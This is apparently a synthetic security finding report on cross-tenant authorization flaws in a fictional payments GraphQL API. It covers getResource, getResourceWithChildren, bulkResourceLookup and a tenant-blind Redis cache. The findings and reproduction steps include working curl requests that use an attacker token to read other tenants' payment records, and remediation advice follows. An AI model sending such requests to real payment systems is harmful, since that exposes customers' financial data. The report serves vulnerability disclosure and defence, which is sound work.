## System

- System: PayBridge Transaction API v3.5.7
- Domain: FINTECH / PAYMENTS GATEWAY
- Example ID: GQL-0420
- Risk ID: RISK-GQL-420

## Findings

### 1. Pattern 1.2 — Related/Linked Resource Traversal: `bulkResourceLookup` (HAR Primary)

**HAR evidence**: JWT `x-tenant-id: tenant-121f`. Request: `bulkResourceLookup(ids: ["R-2420", "R-1420", "R-3420"])`. Response: HTTP 200 with `tenantId: "tenant-fe91"`, `sensitiveField: "CONFIDENTIAL-121ffe91"`, `internalNotes: "Internal data exposed"`. Section 4.0: "bulkResourceLookup mutation accepts an arbitrary array of IDs without per-ID ownership filtering."

**Pattern 1.2 (Related or Linked Resources)**: resources (payment transactions) are linked to child resources (payment legs, sub-transactions, items). The resolver traverses from a parent resource to its related children without checking each child's `tenantId`. In bulk operations, `tenant-121f` can mix its own `R-1420` with cross-tenant IDs (`R-2420`, `R-3420`) to enumerate linked financial data across tenant boundaries — PCI DSS Requirement 7 violation.

Note: HAR response body shows `getResource` shape — synthetic artifact of the test harness. The demonstrated `bulkResourceLookup` BOLA is the primary attack.

**Fintech / Payments Gateway impact**: resources represent payment transactions and their linked sub-records (payment legs, settlement instructions, refund records). Cross-tenant bulk lookup exposes another payment gateway's transaction details, financial data, and internal notes — PCI DSS compliance failure.

### 2. Related Resource Traversal — `getResourceWithChildren` (Pattern 1.2 Core)

`getResourceWithChildren(id: ID!): Resource` — traverses from a transaction resource to its linked `items` without per-item tenant check. Accessing a cross-tenant parent resource reveals all its linked child payment records.

```bash
curl -s -X POST https://api.paybridge-transactio.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-121F>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-121f" \
  -d '{"query": "query { getResourceWithChildren(id: \"R-2420\") { resourceId tenantId items { ... on Item { id tenantId } } data { sensitiveField } } }"}'
```

Vulnerable: Returns `tenant-fe91` transaction with all linked payment legs and sub-items.

### 3. Single-ID Cross-Tenant Read — `getResource` (RISK-GQL-420)

Section 4.0 (RISK-GQL-420): "`getResource` resolver fetches by `resourceId` only. Does NOT verify `tenantId` match."

```bash
curl -s -X POST https://api.paybridge-transactio.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-121F>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-121f" \
  -d '{"query": "query { getResource(id: \"R-2420\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
```

Vulnerable: Returns `tenantId: "tenant-fe91"`, `sensitiveField`, `internalNotes`.  
Secure: `{"errors": [{"message": "Forbidden"}], "data": {"getResource": null}}`.

### 4. Redis Cache Payment Data Leak

Section 2.0: "Redis cache keyed by `resourceId` (NOTE: no user dimension in cache key)." `tenant-121f` requesting `R-2420` receives `tenant-fe91`'s payment transaction data from cache.

## Reproduction

**Step 1 — Baseline:**

```bash
curl -s -X POST https://api.paybridge-transactio.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-121F>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-121f" \
  -d '{"query": "query { getResource(id: \"R-1420\") { resourceId tenantId data { sensitiveField } } }"}'
```

Expected: `tenantId: "tenant-121f"` — own payment transaction.

**Step 2 — Bulk cross-tenant payment lookup (primary HAR attack):**

```bash
curl -s -X POST https://api.paybridge-transactio.example.com/graphql \
  -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-121F>" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-121f" \
  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-2420\", \"R-1420\", \"R-3420\"]) { resourceId tenantId data { sensitiveField internalNotes } } }"}'
```

Vulnerable: Returns payment records from `tenant-fe91` and other tenants.

## Evidence

- **HAR**: `bulkResourceLookup(ids: ["R-2420", "R-1420", "R-3420"])` with `tenant-121f` JWT → HTTP 200 → `tenantId: "tenant-fe91"`, `sensitiveField`, `internalNotes`.
- **Section 4.0 (RISK-GQL-420)**: `getResource` resolver lacks tenant check.
- **Section 4.0**: `bulkResourceLookup` has no per-ID ownership filtering.
- **Section 3.0**: `getResourceWithChildren` exposes linked payment items without per-item check.
- **Section 2.0**: Redis cache keyed by `resourceId` only.

## Remediation

- **Resolver-level tenant check**: `WHERE resourceId = $id AND tenant_id = $jwtTenantId` in `getResource` and `getResourceWithChildren` (RISK-GQL-420).
- **Per-ID ownership filter in `bulkResourceLookup`**: post-fetch filter returning only `tenantId === jwtTenantId` items.
- **Per-item check in `getResourceWithChildren`**: validate each child item's `tenantId` before returning.
- **Fix Redis cache key**: include `tenantId` and `userId` (e.g., `resource:{tenantId}:{resourceId}`).
- **PCI DSS Requirement 7**: implement need-to-know access control on all payment transaction resolvers.
